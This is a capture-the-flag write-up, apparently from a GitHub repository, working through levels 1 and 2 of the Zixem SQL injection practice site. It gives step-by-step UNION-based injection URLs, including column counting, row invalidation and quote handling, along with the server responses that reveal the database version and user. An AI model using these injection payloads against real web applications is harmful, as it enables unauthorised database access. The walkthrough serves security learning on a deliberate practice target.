# Rules!
- Use only **UNION** BASED!
- Your mission is to select only the **version()** & **user()**.
- **Have Fun** (:

# Reference Table:
- [Level 1](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-1)
- [Level 2](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-2)
- [Level 3](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-3)
- [Level 4](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-4)
- [Level 5](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-5)
- [Level 6](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-6)
- [Level 7](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-7)
- [Level 8](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-8)
- [Level 9](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-9)

  ===========================================================================================================  

## [Level 1](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-1)
Start: `[https://zixem.altervista.org/SQLi/level1.php?id=1](https://zixem.altervista.org/SQLi/level1.php?id=1)`  
> - **Item ID:** 1
> - **Price:** 20$

=> I guess the Query can be:  
`SELECT * FROM <db> WHERE id=1`  
=> We should add `UNION SELECT 1,2;--`  
`https://zixem.altervista.org/SQLi/level1.php?id=1%20UNION%20SELECT%201,2;--`
> - The used SELECT statements have a different number of columns **Item ID:**
> - **Price:** $

=> So it doesn't have 2 columns, let's try again with more to see if the error still exist.  
`https://zixem.altervista.org/SQLi/level1.php?id=1%20UNION%20SELECT%201,2,3;--`
> - **Item ID:** 1
> - **Price:** 20$

=> But the Data is not shown in the result. It is caused of the "id=1" data came before our data, let's **invalidate** it first.  
`https://zixem.altervista.org/SQLi/level1.php?id=1%20AND%201=2%20UNION%20SELECT%201,2,3;--`
> - **Item ID:** 2
> - **Price:** 1$

Ok let's extract *version()* and *user()*:  
##### Result: #####  
`https://zixem.altervista.org/SQLi/level1.php?id=1%20AND%201=2%20UNION%20SELECT%20version(),user(),3;--`
> - **Item ID:** zixem@localhost
> - **Price:** 5.6.33-log$

**Bazinga!**  
###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######

  ===========================================================================================================  

## [Level 2](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-2)
Start: `[https://zixem.altervista.org/SQLi/level2.php?showprofile=4](https://zixem.altervista.org/SQLi/level2.php?showprofile=4)`  
> **User-ID:** 4
> **Username:** ZiX-M
> **Age:** 17

=> Test with prev payload:  
`https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%20UNION%20SELECT%201,2,3,4--`
> Nothing to show.

=> It shows nothing. That means it can be take string instead of integer, so we have to add `'` into our payload:  
`https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3--`
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1

=> OK, so we have problem with `apostrophe (')`  
`https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3--%27`
> The used SELECT statements have a different number of columns

=> It is ok now, but we have select wrong number of columns:  
`https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3,4--%27`
> **User-ID:** 1
> **Username:** 2
> **Age:** 3

=> It is Done. Let's grep the *version()* & *user()*:  
##### Result: #####  
`https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
> **User-ID:** 5.6.33-log
> **Username:** zixem@localhost
> **Age:** 3

**Bazinga!**  
###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
